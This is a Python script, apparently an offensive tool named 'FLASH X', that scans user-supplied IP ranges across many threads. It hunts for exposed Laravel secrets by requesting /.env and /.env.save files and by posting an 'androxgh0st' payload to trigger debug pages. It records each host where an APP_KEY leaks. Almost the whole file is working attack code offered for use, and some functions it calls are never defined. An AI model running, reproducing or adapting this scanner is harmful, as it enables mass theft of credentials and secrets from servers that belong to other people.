from multiprocessing.dummy import Pool
import warnings,random,socket,threading
from re import findall as reg
import requests, re, sys, os
from colorama import Fore, Style, Back
import paramiko
from colorama import init
from time import time as timer  
import subprocess
import time
import hashlib
import datetime
import ipaddress
from multiprocessing.dummy import Pool
import smtplib
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror
from twilio.rest import Client
import boto3
import random
init()


lock = threading.Lock()
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[0m'
def logo():
    clear = "\x1b[0m"

    x = """
    \033[92m
  ███████╗██╗░░░░░░█████╗░░██████╗██╗░░██╗  ██╗░░██╗
  ██╔════╝██║░░░░░██╔══██╗██╔════╝██║░░██║  ╚██╗██╔╝
  █████╗░░██║░░░░░███████║╚█████╗░███████║  ░╚███╔╝░
  ██╔══╝░░██║░░░░░██╔══██║░╚═══██╗██╔══██║  ░██╔██╗░
  ██║░░░░░███████╗██║░░██║██████╔╝██║░░██║  ██╔╝╚██╗
  ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═╝░░╚═╝
  
-------------------------------------------------------------------"""
    print (x)
logo()


def makethread18(jumlah):
  try:
    global threads18
    print("""input your ip range example \033[93mStart ips = 3.1.1.1 to ips 3.253.253.253""")
    ipsmin = input("Start Ips : ")
    ipsmax = input("To Ips: ")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb2 , args=(url,))
        threads18.append(thread)
        thread.start()
        if len(threads18) == th:
            for i in threads18:
                i.join()
            threads18 = []

  except Exception as e:
    pass


def checkweb(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                live.close()
                live2.close()
        else:
                get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source3:
                    with lock:
                        print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
                    live = open('Result/good ips.txt', 'a')
                    live.write(str(ori)+ '\n')
                    live2 = open('Result/good debug.txt', 'a')
                    live2.write(str(ori)+ '\n')
                    live.close()
                    live2.close()
                else:
                    get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                    if "APP_KEY" in str(get_source5):
                        with lock:
                            print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good env.txt', 'a')
                            live2.write(str(ori)+'/.env'+ '\n')
                            live.close()
                            live2.close()
                    else:
                            get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                            if "<td>APP_KEY</td>" in get_source6:
                                with lock:
                                    print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
                                live = open('Result/good ips.txt', 'a')
                                live.write(str(ori)+ '\n')
                                live2 = open('Result/good debug.txt', 'a')
                                live2.write(str(ori)+ '\n')
                                live.close()
                                live2.close()
                            else:
                                with lock:
                                    print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")
                        
            
    except:
        with lock:
            print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")
        pass

def checkweb2(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                dorkscan(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscan(url)
          else:
              get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good env.txt', 'a')
                      live2.write(str(ori)+'/.env'+ '\n')
                      dorkscan(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscan(url)
                  else:
                      with lock:
                          print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")

    except:
        with lock:
            print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")
        pass

def checkweb3(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                dorkscansave(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscansave(url)
          else:
              get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .env")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good env.txt', 'a')
                      live2.write(str(ori)+'/.env'+ '\n')
                      dorkscansave(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print("\033[92m[+] "+'\033[92m'+url +"  \033[92mLaravel Found | .debug")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscansave(url)
                  else:
                      get_source6 = requests.get('http://'+url+'/.env.save', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                      if "APP_KEY" in str(get_source6):
                        with lock:
                            print('\033[93m'+url +" => \033[92mGood | .env.save")
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good env-save.txt', 'a')
                            live2.write(str(ori)+'/.env.save'+ '\n')
                            dorkscansave(url)
                      else:
                        with lock:
                            print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")

    except:
        with lock:
            print("[-] "+'\033[93m'+url +"  \033[91mNOT Laravel Site OR NOT Vuln")
        pass

threads17 = []
threads18 = []
threads19 = []
threads20 = []
threads22 = []

def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(1./10)


try:
    slowprint('''   Hy Guys Welcome To MY IP Generator And Auto Laravel Checker ''')
    print('''-------------------------------------------------------------------
                    Please Putt YOUR Threads 200 or 100
    ''')
    Targetssas = input("$----With thread or no [y/n] : ") #for date
    if Targetssas == "y":
      jumlahkn = input("Thread : ") #for date
      makethread18(jumlahkn)
    else:
     makethread18(1)
except KeyboardInterrupt as e:
    print("Exit Program")
    sys.exit()